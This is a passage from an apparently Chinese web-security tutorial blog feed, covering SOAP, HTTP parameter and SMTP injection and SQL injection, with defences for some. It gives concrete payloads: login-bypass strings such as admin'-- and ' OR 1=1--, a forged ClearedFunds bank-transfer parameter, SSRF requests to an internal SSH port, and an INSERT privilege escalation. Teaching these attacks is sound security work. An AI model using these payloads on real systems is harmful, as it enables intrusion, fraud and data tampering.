color="#fb8c00">test<foo></foo></font><br>如果发现其中一个值的返回结果为另一个值，或者只返回test，那么可以确信输入被插入到了XML中</li><li>如果HTTP请求中包含几个可放入SOAP消息的参数，尝试在一个参数中插入起始注释字符&lt;! –,在另一个参数添加结束注释字符–&gt;。然后，轮换在参数中插入这两个字符(因为无法知道参数出现的顺序)。这样做可能会把服务器SOAP消息的某个部分作为注释处理，从而改变应用程序的逻辑，或者形成一个可能造成信息泄露的不同错误条件。</li></ul><h3 id="防止SOAP注入"><a href="#防止SOAP注入" class="headerlink" title="防止SOAP注入"></a>防止SOAP注入</h3><p>我们可以在用户提交的数据被插入SOAP消息中的任何位置实施边界确认过滤，以防止SOAP注入。需要过滤的数据包括用户在当前请求中直接提交的数据，以及在前面的请求中已经存在或由以用户数据为输入的其他处理过程生成的数据<br>为防止以上攻击，应用程序应对出现在用户输入中的任何XML元字符进行HTML编码。HTML编码包含对应的HTML实体替代字面量字符。这样做可以确保XML解释器在进行处理时，把它们当做相关元素的数据值，而不是消息结构的一部分。一些经常造成问题的字符的HTML编码如下：</p><pre class=" language-bash"><code class="language-bash"> <span class="token operator">&lt;</span>—— <span class="token operator">&amp;</span>1t<span class="token punctuation">;</span> <span class="token operator">></span>—— <span class="token operator">&amp;</span>gt<span class="token punctuation">;</span> /—— <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#47;</span></code></pre><h2 id="注入后端HTTP请求"><a href="#注入后端HTTP请求" class="headerlink" title="注入后端HTTP请求"></a>注入后端HTTP请求</h2><p>应用程序可能会将用户输入嵌入任何类型的后端HTTP请求，包括那些以常规名/值对传输参数的请求。由于应用程序通常会有效代理用户提交的URL或参数。因而这种行为往往易于受到攻击。针对这种功能的攻击分为以下类别：</p><ul><li>服务器端HTTP重定向：攻击者可以通过这种服务器方法指定任意资源或URL，然后再由后端应用程序服务器请求这些资源或URL</li><li>HTTP参数注入(HPI)：攻击者可以通过这种方法在应用程序服务器提出的后端HTTP请求中注入任意参数。如果攻击者注入后端请求中已存在的参数，就可以利用HTTP参数污染(HPI)攻击覆盖服务器指定的原始参数值。</li></ul><h3 id="服务器端HTTP重定向"><a href="#服务器端HTTP重定向" class="headerlink" title="服务器端HTTP重定向"></a>服务器端HTTP重定向</h3><p>如果应用程序接受用户可控制的输入，并将其合并到使用后端HTTP请求检索的URL中，这种行为就会导致服务器端重定向漏洞。用户提交的输入中可能包含被检索的完整URL，或者应用程序可能会对该URL进行某种处理，如添加标准的后缀。<br>后端HTTP请求可能指定公共因特网的某个域，或者指定用户无法直接访问的内部服务器。所请求的内容可能对应用程序的功能非常重要，如支付网关的接口等。这种技巧常用于将几个单独的内部和外部应用程序组件组合到一个前端应用程序中，再由该应用程序代表这些组件实施访问控制和会话管理。如果攻击者能够控制后端HTTP请求中的IP地址或主机名，他就可以使应用程序服务器连接到任意资源，有时甚至能够检索后端响应的内容。</p><p>以下面的前端请求为例，其中的loc参数用于指定客户端希望查看的CSS文件版本：</p><pre class=" language-bash"><code class="language-bash">POST /account/home HTTP/1.1Content-Type: application/x-www-form-urlencodedHost: wahh-blogs.netContent-Length:65view<span class="token operator">=</span>default<span class="token operator">&amp;</span>loc<span class="token operator">=</span>online.wahh-blogs.net/css/wahh.css</code></pre><p>如果没有在loc参数中为URL指定确认机制，攻击者就可以指定任何主机名来替代online.wahh-blogs.net。应用程序将检索指定的资源，导致攻击者将应用程序用作潜在的敏感后端服务的代理服务器。在下面的示例中，攻击者使应用程序连接到后端SSH服务：</p><pre class=" language-bash"><code class="language-bash">POST /account/home HTTP/1.1Content-Type: application/x-www-form-urlencodedHost: wahh-blogs.netContent-Length:65view<span class="token operator">=</span>default<span class="token operator">&amp;</span>loc<span class="token operator">=</span>192.168.0.1:22</code></pre><p>应用程序的响应包含所请求的SSH服务的旗标：</p><pre class=" language-bash"><code class="language-bash">HTTP/1.1 200 OKConnection: closeSSH-2.0-OpenSSH_4.2Protocol mismatch.</code></pre><p>攻击者可以利用HTTP重定向漏洞，将易受攻击的应用程序作为开放的HTTP代理服务器。以实施各种攻击。</p><ul><li>攻击者可以将该代理服务器用于攻击互联网的第三方系统。恶意流量针对的是运行易受攻击的应用程序的服务器上的目标</li><li>攻击者可以将该代理服务器用于连接到组织内部网络中的任意主机，从而访问无法通过因特网直接访问的目标</li><li>攻击者可以将该代理服务器反向连接在应用程序服务器本身上运行的其他服务。从而突破防火墙的限制，并利用信任关系来避开身份验证。</li><li>攻击者可以通过使应用程序在响应中包含受控的内容，利用代理功能实施跨站点攻击(请参阅Web安全(10))</li></ul><blockquote><p>注：一些服务器端重定向API，如ASP.NET中的Server.Transfer()和Server.Execute(),仅可重定向到同一主机上的相关URL。</p></blockquote><h3 id="HTTP参数注入-HPI"><a href="#HTTP参数注入-HPI" class="headerlink" title="HTTP参数注入(HPI)"></a>HTTP参数注入(HPI)</h3><p>如果用户提交的参数被用作后端HTTP请求中的参数，这时就会导致HTTP参数注入(HPI)。<br>以下面的之前易于受SOAP注入的银行转账功能为例。</p><pre class=" language-bash"><code class="language-bash">POST /bank/48/Default.aspx HTTP/1.0Host: mdsec.netContent-Length: 65FromAccount<span class="token operator">=</span>18281008<span class="token operator">&amp;</span>Amount<span class="token operator">=</span>1430<span class="token operator">&amp;</span>ToAccount<span class="token operator">=</span>08447656<span class="token operator">&amp;</span>Submit<span class="token operator">=</span>Submit</code></pre><p>这个前端请求由用户浏览器提出，将导致应用程序向银行基础架构中的另一台Web服务器提出其他HTTP请求，在以下后端请求中，应用程序从前端请求中复制了一些参数值。</p><pre class=" language-bash"><code class="language-bash">POST /doTransfer.asp HTTP/1.0Host: mdsec-mgr.int.mdsec.netContent-Length: 44formmac<span class="token operator">=</span>18281008<span class="token operator">&amp;</span>amount<span class="token operator">=</span>1430<span class="token operator">&amp;</span>tomac<span class="token operator">=</span>08447656</code></pre><p>这个请求要求后端服务器检查是否有清算资金可以转账，如果有，则进行转账。但是，前端服务器可以通过提供以下参数，指定存在清算资金，从而避开以上检查：</p><pre class=" language-bash"><code class="language-bash">ClearedFunds<span class="token operator">=</span>true</code></pre><p>如果攻击者发现这种行为，他就可以尝试实施HPT攻击。在后端请求中注入ClearedFunds参数。要注入该参数，他将所需参数附加到现有参数值的后面，并将分隔名称和值的&amp;和=字符进行URL编码。如下所示:</p><pre class=" language-bash"><code class="language-bash">POST  /bank/48/Default.aspx HTTP/1.0Host: mdsec.netContent-Length: 96FromAccount<span class="token operator">=</span>18281008<span class="token operator">&amp;</span>Amount<span class="token operator">=</span>1430<span class="token operator">&amp;</span>ToAccount<span class="token operator">=</span>08447656<span class="token operator">&amp;</span>ClearedFunds%3dtrue<span class="token operator">&amp;</span>Submit<span class="token operator">=</span>Submit</code></pre><p>当应用程序处理这个请求时，它会以正常方式对参数值进行URL编码。因此，前端应用程序收到的ToAccount参数的值为：</p><pre class=" language-bash"><code class="language-bash">08447656<span class="token operator">&amp;</span>ClearedFunds<span class="token operator">=</span>true</code></pre><p>如果前端应用程序没有确认这个值并将它按原样传递给后端请求，应用程序将提出以下后端请求，使攻击者能够成功避开清算资金检查。</p><pre class=" language-bash"><code class="language-bash">POST /doTransfer.asp HTTP/1.0Host: mdsec.netContent-Length: 62formmac<span class="token operator">=</span>18281008<span class="token operator">&amp;</span>amount<span class="token operator">=</span>1430<span class="token operator">&amp;</span>tomac<span class="token operator">=</span>08447656<span class="token operator">&amp;</span>ClearedFunds<span class="token operator">=</span>true</code></pre><blockquote><p>注：与SOAP不同，在后端请求中注入任意异常参数不会导致错误。因此，要想成功实施攻击，需要清楚了解应用程序具体使用了哪些后端参数。</p></blockquote><h4 id="HTTP参数污染-HPP"><a href="#HTTP参数污染-HPP" class="headerlink" title="HTTP参数污染(HPP)"></a>HTTP参数污染(HPP)</h4><p>如果一个请求中包含多种请求，Web服务器通常会采取的处理方式如下：</p><ul><li>使用参数的第一个实例</li><li>使用参数的最后一个实例</li><li>串联参数值，可能在参数之间添加分隔符</li><li>构建一个包含所有请求值的数组</li></ul><p>在前面的HPI示例中，攻击者可以在后端请求中添加一个新参数。实际上，攻击者可以对其实施注入攻击的请求很可能已经包含一个与攻击者所针对的参数同名的参数。在这种情况下，攻击者可以使用HPI条件注入另一个同名参数。随后，应用程序将表现何种行为，将取决于后端HTTP服务器如何处理重复参数。这样，攻击者或许可以用他注入的参数“覆盖”原始参数值。</p><p>HPP攻击能否成功，很大程度上取决于目标应用程序服务器如何处理多个同名参数，以及后端请求中的插入点是否正确。如果两种技术需要处理相同的HTTP请求，HPP攻击就会造成严重的后果。Web应用程序防火墙或反向代理可能会处理某个请求，并将其传递给Web应用程序，由Web应用程序抛弃变量，甚至是基于之前不相关的请求部分构建字符串。</p><h4 id="攻击URL转换"><a href="#攻击URL转换" class="headerlink" title="攻击URL转换"></a>攻击URL转换</h4><p>许多服务器会在所请求的URL抵达时重写这些URL，再将它们映射到应用程序中的相关后端功能。服务器在处理REST风格的参数、定制导航包装器以及其他URL转换方法时都会进行URL重写。这种处理方式可能易受HPI和HPP攻击。</p><p>为了简化和导航，一些应用程序在URL的文件路径，而非查询字符串中插入参数值。通常，应用程序会采用一些简单的规则转换URL，然后将其发送给真正的目标。攻击者可以利用HPI攻击在经过重写的URL中注入另一个参数。</p><h2 id="注入电子邮件"><a href="#注入电子邮件" class="headerlink" title="注入电子邮件"></a>注入电子邮件</h2><p>SMTP(Simple Mail Transfer Protocol)：一种可靠的电子邮件传输协议。<br>许多应用程序拥有一项允许用户通过应用程序提交信息的功能。例如，向支持人员报告问题或提供关于Web站点的反馈。这项功能一般通过邮件(或SMTP)服务器执行。通常，用户提交的输入被插入到邮件服务器处理的SMTP会话中。如果攻击者能够提交未被过滤或净化的专门设计的输入，就可以在这个会话中插入任意SMTP命令。</p><p>多数时候，应用程序允许用户指定消息的内容和自己的电子邮件(插入到生成电子邮件的From字段中)，还可以指定消息的主题和其他细节。能够控制的任何字段都易于收到SMTP注入。</p><h3 id="操作电子邮件标头"><a href="#操作电子邮件标头" class="headerlink" title="操作电子邮件标头"></a>操作电子邮件标头</h3><p>一下图表单为例。它允许用户发送关于应用程序的反馈。<br><img src="https://i.postimg.cc/65fW8zD3/1.jpg" alt=""><br>在该表单中，用户可指定发件人(From)地址和邮件内容。应用程序将这个输入传送给PHPmail()命令，由它建立邮件并与它配置的邮件服务器进行必要的SMTP会话。生成的邮件如下：</p><pre class=" language-bash"><code class="language-bash">To: admin@qq.comFrom: 123@qq.comSubject: Site problempage don't load</code></pre><p>PHPmain()命令使用additional_headers参数为消息设定发件人地址。这个参数还可以用于指定其它标头，包括Cc和Bcc,并用换行符分隔每个被请求的标头。因此，攻击者可以通过在From字段中注入这其中的某个标头，将邮件发送给任意收件人。如图所示<br><img src="https://i.postimg.cc/bwYzkkhR/2.jpg" alt=""><br>这会导致mail()命令生成以下邮件：</p><pre class=" language-bash"><code class="language-bash">To: admin@qq.comFrom: 123@qq.comBcc: all@qq-othercompany.comSubject: Site problempage don't load</code></pre><h3 id="SMTP命令注入"><a href="#SMTP命令注入" class="headerlink" title="SMTP命令注入"></a>SMTP命令注入</h3><p>在其他情况下，应用程序可能会执行SMTP会话，或者将用户提交的输入传送给一个不同的组件以完成这一任务。这时，我们就可以直接在这个会话中注入任意SMTP命令，完全控制由应用程序生成的信息。</p><p>例如，一个使用以下请求提交站点反馈的应用程序为例：</p><pre class=" language-bash"><code class="language-bash">POST feedback.php HTTP/1.1Host: wahh-app.comContent-Length: 56From<span class="token operator">=</span>daf<span class="token operator">&amp;</span>wahh-mail.com<span class="token operator">&amp;</span>Subject<span class="token operator">=</span>Site+feedback<span class="token operator">&amp;</span>Message<span class="token operator">=</span>foo</code></pre><p>应用程序会使用以下命令开始一个SMTP会话:</p><pre class=" language-bash"><code class="language-bash">MAIL FROM: daf@wahh-mail.comRCPT TO: feedback@wahh-app.comDATAFrom: daf@wahh-mail.comTo: feedback@wahh-app.comSubject: Site feedbackfoo<span class="token keyword">.</span></code></pre><p>这时，攻击者可以在任何受控的电子邮件字段中注入任意SMTP命令。</p><blockquote><p>注：SMTP客户端发送DATA命令后，应用程序送出电子邮件消息的内容，包括消息头和主体，然后发送一个电字符(.)。这告诉服务器消息已发送完毕，客户端可以发送其他SMTP命令，发送其他消息。</p></blockquote><h3 id="防止SMTP注入"><a href="#防止SMTP注入" class="headerlink" title="防止SMTP注入"></a>防止SMTP注入</h3><p>如果对提交给电子邮件功能或SMTP会话使用的任何用户提交的数据进行严格的检查，就可以防止SMTP注入漏洞。因此，可根据其用途对每项数据进行尽可能严格的确认</p><ul><li>应根据一个适当的正则表达式检查电子邮件地址(当然应拒绝所有换行符)</li><li>消息主题不得包含任何换行符，并应实施适当的长度限制</li><li>如果消息内容被一个SMTP会话直接使用，那么应禁止使用仅包含一个字符的消息行。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全(8)</title>
      <link href="/2019/11/06/websecurity8/"/>
      <url>/2019/11/06/websecurity8/</url>
      
        <content type="html"><![CDATA[<h2 id="数据存储区"><a href="#数据存储区" class="headerlink" title="数据存储区"></a>数据存储区</h2><ul><li>几乎所有应用程序都依赖数据存储区来管理在应用程序中处理的数据。在许多情况下，这些数据负责处理核心应用程序逻辑、保存用户账户、权限、应用程序配置设置等。大多数数据存储区都保存有结构化、可以使用预先定义的查询格式或语言访问的数据，并包含内部逻辑来管理这些数据。</li><li>通常，应用程序使用常用的权限级别来管理对数据存储区的各种访问操作，以及处理属于不同应用程序用户的数据。如果攻击者能够破坏应用程序与数据存储区的交互，使应用程序检索或修改各种数据，攻击者就可以避开在应用层次对数据访问实施的任何控制</li><li>迄今为止最为实用的数据存储区是SQL数据库，基于XML的资料库、LDAP目录，以及常见的一些示例。</li></ul><h2 id="注入解释型语言"><a href="#注入解释型语言" class="headerlink" title="注入解释型语言"></a>注入解释型语言</h2><p>解释型语言(interpreted language)：是一种在运行时由一个运行时组件(runtime component)解释语言代码并执行其中包含的指令的语言。<br>编译型语言(compiled language)：它的代码在生成时转换成机器指令，然后在运行时直接使用该语言的计算机处理器执行这些指令</p><ul><li>开发Web应用程序使用的许多核心语言使用解释器执行，包括SQL/LDAP/Perl/PHP</li><li>基于解释型语言的执行方式，产生了一系列叫做代码注入(code injection)的漏洞。任何有实际用途的应用程序都会收到用户提交的数据，对其进行处理并执行相应的操作。因此，有解释器处理的数据实际上是由程序员编写的代码和用户提交的数据共同组成的。有些时候，攻击者可以提交专门设计的输入，通常提交某个在应用程序中使用解释型语言语法的具有特殊意义的句法，向应用程序实施攻击。结果，这个输入的一部分被解释为程序指令执行，好像它们是由最初开发的程序员写的一样。因此，如果这种攻击取得成功，它将完全攻破目标应用程序的组件</li><li>另一方面，在编译型语言中实施旨在执行任意命令的攻击往往非常困难。这时，注入代码的方法通常不利用开发目标程序所使用语言的任何语法特性，注入的有效载荷为机器代码，而不是用那种语言编写的指令。</li></ul><h3 id="避开登录"><a href="#避开登录" class="headerlink" title="避开登录"></a>避开登录</h3><p>无论访问操作是由普通用户还是应用程序管理员触发，应用程序访问数据存储区的过程都大致相同。Web应用程序对数据存储区采用自主访问控制机制，构造查询基于用户的账户和类型来检索、添加或修改数据存储区的数据。修改查询(不只是查询中的数据)的成功注入攻击可以避开应用程序的自主访问控制并获取未授权访问。</p><p>如果需要安全保护的应用程序逻辑由查询结果控制，攻击者就可以通过修改查询来更改应用程序的逻辑。一个例子，在后端数据存储区的数据表中查询与用户提供的证书匹配的记录。许多实施基于表单的登录功能的应用程序使用数据库来存储用户证书，并执行简单的SQL查询来确认每次登录尝试。以下是一个典型的示例：</p><h4 id="管理员用户名已知"><a href="#管理员用户名已知" class="headerlink" title="管理员用户名已知"></a>管理员用户名已知</h4><p><font color="#fb8c00">SELECT * FROM users WHERE username = ‘alice’ and password = ‘secret’</font><br>这个查询要求数据库检查用户表中的每一行，提取出每条username列值为alice、password列值为’secret’的记录。如果应用程序收到一名用户的资料，登录尝试将取得成功，应用程序将为该用户创建一个会话。<br>在这种情况下，攻击者可以注入用户名或密码字段，以修改应用程序执行的查询，从而破坏它的逻辑。例如，如果攻击者知道应用层程序管理员的用户名为admin，那么他就可以通过提交以下用户名和任意密码，以管理员的身份登录：<br><font color="#fb8c00">admin’–</font><br>应用程序将执行下列查询：<br><font color="#fb8c00">SELECT * FROM users WHERE username = ‘admin’–’ AND password = ‘foo’</font><br>因为使用了注释符号(–)，上面的查询等同于：<br><font color="#fb8c00">SELECT * FROM users WHERE username=’admin’</font><br>于是这个查询完全避开了密码检查</p><h4 id="管理员用户名未知"><a href="#管理员用户名未知" class="headerlink" title="管理员用户名未知"></a>管理员用户名未知</h4><p>在大多数应用程序中，数据库第一个账户为管理员，因为这个账户通常手工创建，然后通过它生成其他应用程序账户。而且，如果查询返回几名用户的资料，许多应用程序只会处理第一名用户。因此，攻击者可以利用这种行为，通过提交以下用户名，以数据库中的第一个用户的身份登录:<br><font color="#fb8c00">‘ OR 1=1–</font><br>应用程序将执行下列查询<br><font color="#fb8c00">SELECT * FROM users WHERE username = ‘’ OR 1=1–’ AND password = ‘foo’</font><br>因为其中用了注释符号，上面的查询等同于<br><font color="#fb8c00">SELECT * FROM users WHERE username = ‘’ OR 1=1</font><br>该查询将返回全部应用程序用户的资料</p><h2 id="注入SQL"><a href="#注入SQL" class="headerlink" title="注入SQL"></a>注入SQL</h2><p>几乎每一个Web应用程序都使用数据库来保存操作所需的各种信息。数据库中的信息通过SQL(Structured Query Language,结构化查询语句)访问。SQL可用于读取、更新、增加或删除数据库中保存的信息。</p><ul><li>SQL是一种解释型语言，Web应用程序经常建立合并用户提交的数据的SQL语句。因此，如果建立语句的方法不安全，那么应用程序可能易于受到SQL注入攻击。在最严重的情况下，匿名攻击者可利用SQL注入读取并修改数据库中保存的所有数据，甚至完全控制运行数据库的服务器</li><li>许多应用程序以API来避免SQL注入，如果使用得当，这些API能够有效阻止SQL注入攻击，在这种情况下，通常只有在无法应用这些防御机制时，SQL注入才会发生。</li><li>虽然对于绝大多数数据库而言，SQL注入的基本原理大致相似，但它们之间存在许多差异，包括语法上的细微变化以及可能影响攻击者所使用的攻击类型的巨大行为与功能差异</li></ul><blockquote><p>注：从目标应用程序收到的响应一般并不完整或者含义模糊，需要猜测才能理解，这个时候，访问和目标应用程序所使用的数据库相同的、在本地安装的数据库会帮助理解，如果这个方法不可行，最好找一个可以进行测试的适当交互式在线环境，如SQLzoo.net中的交互式在线教程</p></blockquote><h3 id="利用一个基本的漏洞"><a href="#利用一个基本的漏洞" class="headerlink" title="利用一个基本的漏洞"></a>利用一个基本的漏洞</h3><ol><li>下面是一条书籍零售商Web应用程序的查询语句<br><font color="#fb8c00">SELECT author,title,year FROM books WHERE publisher = ‘Wiley’ and published=1</font><br>该查询语句要求数据库检查书籍表的第一行，提取每条publisher列为Wiley值的记录，并返回所有记录，然后应用程序处理这组记录，并通过一个HTML页面将结果显示给用户。</li></ol><blockquote><p>注：SQL查询中的字符串必须包含在单引号内，与查询的其他内容分隔开</p></blockquote><ol start="2"><li><p>如果查询所有由O’Reilly出版的书籍，则使用下列查询语句：<br><font color="#fb8c00">SELECT author,title,year FROM books WHERE publisher = ‘O’Reilly’ and publisher=1 </font><br>在上述示例中，查询解释器以和第一个示例相同的方式到达字符串数据位置。它解析包含在单引号中的数据，得到值O。然后遇到表达式Reilly’，这并不是有效的SQL语法，因此应用程序会生成一条错误信息。</p></li><li><p>如果应用程序以这种方式运行，那么它非常容易遭受SQL注入。攻击者可提交包含引号的输入终止他控制的字符串，然后编写任意的SQL修改开发者想要应用程序执行的查询。例如，在这个示例中，可输入以下搜索项：<br><font color="#fb8c00">Wiley’ OR 1=1–</font><br>应用程序将执行以下查询：<br><font color="#fb8c00">SELECT author,title,year FROM books WHERE publisher = ‘Wiley’ OR 1=1–’ and publisher=1</font><br>此种做法不会引起2中的错误，原因在下一条进行解释。数据库将检查书籍表中的每一行，提取publisher列值为Wiley或其中1等于1的每条记录，因为1总是等于1，所以数据库将返回书籍表中的所有记录。</p></li><li><p>攻击者的输入中的双连字符串在SQL中是一个有意义的表达式，它告诉查询解释器该行的其他部分属于注释，应被忽略。在上面的示例中，应用程序将用户提交的字符串包含在单引号内，因为攻击者已经终止他控制的字符串并注入其他一些SQL，他需要处理字符串末尾的单引号，避免出现2中相同的语法错误。攻击者在3中添加一个双连字符达到这一目的，将查询的剩余部分以注释处理。在MySQL中，需要在双连字符后加入一个空格，或者使用”#”符号指定注释。在1中的原始查询中还将访问权限仅限于已出版的书籍，因为它指定and published = 1，通过注入注释序列，攻击者获得未授权访问权限，可以返回所有书籍(包括已出版的其他书籍)的详细信息。</p></li></ol><blockquote><p>注：有时，可以不使用注释符号处理字符串末尾部分的引号，而用一个需要引号包含的字符串数据结束注入的输入，以此“平衡引号”。例如，输入以下搜索项： Wiley’ OR ‘a’=’a 将生成以下查询:SELECT author,title,year FROM books WHERE publisher=’Wiley’ OR ‘a’=’a’。这个查询完全有效，可以得到和1=1攻击相同的效果</p></blockquote><h3 id="注入不同的语句类型"><a href="#注入不同的语句类型" class="headerlink" title="注入不同的语句类型"></a>注入不同的语句类型</h3><p>任何类型的SQL语句都可能存在SQL缺陷。当与一个远程应用程序交互时，通常情况下不可能提前知道用户输入的一个特殊数据项将有哪种类型的语句处理。但是，可以根据应用程序进行合理猜测，下面是最常用的SQL语句及其用法。</p><h4 id="SELECT语句"><a href="#SELECT语句" class="headerlink" title="SELECT语句"></a>SELECT语句</h4><ul><li>SELECT语句被用于从数据库中获取信息。它们常用于应用程序响应用户操作而返回信息的功能中，如浏览一个产品目录、查看一名用户的资料或进行一项搜索。根据数据库中的数据核对用户提交的信息的登录功能也常用这种语句。</li><li>正如在前面所说的，SQL注入攻击的进入点(entry point)通常是查询中的WHERE子句，它将用户提交的数据传送给数据库，以限制查询结果的查询范围。因为WHERE子句一般在SELECT语句的最后，攻击者就可以使用注释符号将查询截短到其输入的结束位置，而不会使整个查询语句失效。</li><li>SQL注入漏洞偶尔也会影响SELECT查询的其他部分，如ORDER BY子句或列和表的名称</li></ul><h4 id="INSERT语句"><a href="#INSERT语句" class="headerlink" title="INSERT语句"></a>INSERT语句</h4><ul><li><p>INSERT语句用于在表中建立一个新的数据行。应用程序通常使用这种语句添加一条新的审计日志、创建一个新用户账户或生成一个新订单。例如，如果一个应用程序允许用户自我注册，指定他们自己的用户名和密码，就可以使用下面的语句将用户的资料插入users的表中。</p><pre class=" language-bash"><code class="language-bash">INSERT INTO <span class="token function">users</span> <span class="token punctuation">(</span>username,password,ID,privs<span class="token punctuation">)</span> VALUES <span class="token punctuation">(</span><span class="token string">'daf'</span>,<span class="token string">'secret'</span>, 2248, 1<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>如果username或password字段存在SQL注入漏洞，那么攻击者就可以在表中插入任何数据，包括他自己的ID和privs值，然而，想要这样做，攻击者就必须确保VALUES子句中的其他部分正常允许。特别是其中的数据个数与数据类型必须正确，例如，在攻击username字段时，攻击者可以提交以下输入：</p><pre class=" language-bash"><code class="language-bash">foo<span class="token string">', '</span>bar', 9999, 0<span class="token punctuation">)</span>--</code></pre><p>他将创建一个ID为9999，privs为0的账户，如果privs字段用来决定账户权限，那么攻击者就可以利用它创建一个管理用户。</p></li><li><p>有时，攻击者完全盲目地注入一个INSERT语句也能从应用程序中提取出字符串数据。例如，攻击者可以拦截数据库的版本字符串，并把它插入一个字段中；正常情况下，浏览器将显示数据库的版本信息。</p></li></ul><blockquote><p>注：当设法注入一个INSERT语句时，可能无法提前知道需要提交多少个参数或参数的类型。在上面的示例中，可以通过在VALUES子句中持续增加一个新的字段，直到应用程序创建了确实想要的用户账户。例如，当注入username字段时，可以提交以下输入：<br>foo’)–<br>foo’, 1)–<br>foo’, 1, 1)–<br>foo’, 1, 1, 1)–<br>由于大多数据库都会隐式地将一个整数转换成一个字符串，可以在每个位置都使用一个整数。这此示例中，不管其他字段如何，它将生成一个用户名为foo、密码为1的账户。<br>如果使用1仍然遭到拒绝，可以尝试使用值2000，许多数据库也会隐式地将它转换成基于数据的数据类型。<br>在Qracle中，则可以在insert查询内发布subselect查询。</p></blockquote><h4 id="UPDATES语句"><a href="#UPDATES语句" class="headerlink" title="UPDATES语句"></a>UPDATES语句</h4><p>UPDATE语句用于修改表中的一行或几行数据。它们经常用在用户修改已有数据值的功能中，例如，更新联系信息、修改密码或更改订单数量。<br>典型UPDATES语句的运行机制与INSERT语句类似，只是UPDATES语句中通常包含一个WHERE子句，告诉数据库更新表中哪些行的数据。例如，用户在修改密码时，应用程序会执行以下查询： </p><pre class=" language-bash"><code class="language-bash">UPDATE <span class="token function">users</span> SET password<span class="token operator">=</span><span class="token string">'newsecret'</span> WHERE user<span class="token operator">=</span><span class="token string">'alice'</span> AND password <span class="token operator">=</span> <span class="token string">'secret'</span></code></pre><p>实际上，这个查询首先核实用户的密码是否正确，如果密码无误，就用新的值更新它。如果这项功能存在SQL注入漏洞，那么攻击者就能避开密码检查，通过以下用户名更新管理员密码</p><pre class=" language-bash"><code class="language-bash">admin'--</code></pre><blockquote><p>注：由于无法提前知道应用程序将根据专门设计的输入执行什么操作，因此，在一个远程应用程序中探查SQL漏洞往往非常危险。特别注意，修改UPDATES语句中的WHERE子句可能会使一个重要的数据库表发生彻底的改变。例如，如果上面的攻击者之前已经提交了以下用户名：admin’ OR 1=1– 那么应用程序可能会执行以下查询： UPDATES users SET password=’newsecret’ WHERE user=’admin’ OR 1=1 它会重置每个用户的密码！<br>即使攻击的应用程序功能并不会更新任何现有数据，有时候，在用户登录成功后，应用程序会使用用户提交的用户名执行各种UPDATES查询，这意味着任何针对WHERE子句的攻击都可能会“复制”到其他子句中，给所有应用程序用户的资料造成严重破坏。强烈建议在测试之前对数据库进行完整备份。</p></blockquote><h4 id="DELETE语句"><a href="#DELETE语句" class="headerlink" title="DELETE语句"></a>DELETE语句</h4><p>DELETE语句用于删除表中一行或几行数据，例如用户从他们的购物车中删除一件商品或从个人资料中删除一个交货地址。与UPDATES语句一样，DELETE语句通常使用WHERE子句告诉数据库更新表中哪些行的数据，并很可能在这个子句中并入用户提交的数据。破坏正常运行的WHERE子句可能会造成严重的后果，UPDATES语句部分提出的警告同样适用于这种攻击。</p><h3 id="查明SQL漏洞"><a href="#查明SQL漏洞" class="headerlink" title="查明SQL漏洞"></a>查明SQL漏洞</h3><p>在最明显的情况下，只需向应用程序提交一个意外输入，就可以发现并最终确定一个SQL注入漏洞。但在其他情况下，它很难与其他的漏洞或不会造成安全威胁的“良性”异常区分开来，但是，可以通过各种步骤准确查明绝大多数的SQL注入漏洞。</p><h4 id="注入字符串数据"><a href="#注入字符串数据" class="headerlink" title="注入字符串数据"></a>注入字符串数据</h4><p>如果SQL查询合并用户提交的数据，它会将这些数据包含在单引号里，为利用任何SQL注入漏洞，攻击者需要摆脱这些引号的束缚。</p><h4 id="注入数字数据"><a href="#注入数字数据" class="headerlink" title="注入数字数据"></a>注入数字数据</h4><p>如果SQL查询合并用户提交的数字数据，应用程序仍然会将它包含在单引号之中，作为字符串数据进行处理。因此，一定要执行前面针对字符串数据的渗透测试步骤。但是，许多时候，应用程序会将数字数据以数字格式直接传送到数据库中，并不把它放入单引号中。</p><blockquote><p>注：在探查应用程序是否存在SQL注入之类的缺陷时，我们常常会忘记某些字符在HTTP请求中具有特殊含义。如果希望在攻击有效载荷中插入这些字符，必须谨慎对它们进行URL编码，特别是以下字符：</p></blockquote><ol><li>&amp;和=用于连接名/值对，建立查询字符串和POST数据块。应当使用%26与%3d对它们进行编码</li><li>查询字符串中不允许使用空格，如果在其中提交空格，整个字符串会终止，必须使用+或%20对其进行编码</li><li>由于+用于编码空格，如果想在字符串中使用+，必须使用%2b对其进行编码。因此，1+1应以1%2b1的形式提交</li><li>分号用于分隔cookie字段，必须使用%3b对其编码。<br>无论是通过拦截代理服务器直接从浏览器中编辑参数值，或是使用其他方法进行编辑，都必须使用这些编码方式。如果没有进行编码，那么整个请求可能会无效，或提交预期外的数据。</li></ol><h4 id="注入查询结构"><a href="#注入查询结构" class="headerlink" title="注入查询结构"></a>注入查询结构</h4><ul><li>如果用户提交的数据被插入SQL查询结构，而不是查询中的数据项中，这时实施SQL注入攻击只需要直接应用有效的SQL语法，而不要进行任何转义。</li><li>SQL查询结构最常见的注入点是ORDER BY子句。ORDER BY关键字接受某个列名称或编号，并根据该列中的值对结果集进行排序，用户经常使用这种功能对浏览器中的表进行排序。例如，使用以下查询可以检索一个可排序的图书表：<pre class=" language-bash"><code class="language-bash">SELECT author,title,year FROM books WHERE publisher <span class="token operator">=</span> <span class="token string">'Wiley'</span> ORDER BY title ASC</code></pre>如果ORDER BY中的列名称title由用户指定，就没有必要使用单引号，因为用户提交的数据已经直接修改了SQL查询的结构</li></ul><blockquote><p>注：在ORDER BY子句中实施SQL注入时，数据库不会接受查询中的UNION/WHERE/OR/AND关键字。通常，实施注入攻击需要攻击者指定一个嵌套查询来替代参数，如用(select 1 where &lt;<condition>&gt; or 1/0=0)替代列名称。对于支持批量查询的数据库，这可能是最有效的注入攻击方法</p></blockquote><h3 id="“指纹”识别数据库"><a href="#“指纹”识别数据库" class="headerlink" title="“指纹”识别数据库"></a>“指纹”识别数据库</h3><p>要了解所针对的数据库的类型，一种最可靠的方法是根据数据库连接字符串的不同方式进行识别。在控制某个字符串数据项查询时，可以在一个请求中提交一个特殊的值，然后测试各种连接方法，以生成那个字符串。如果得到相同的结果，就可以确定所使用的数据库类型。下面的示例说明常用的数据库如何构建Service字符串</p><pre class=" language-bash"><code 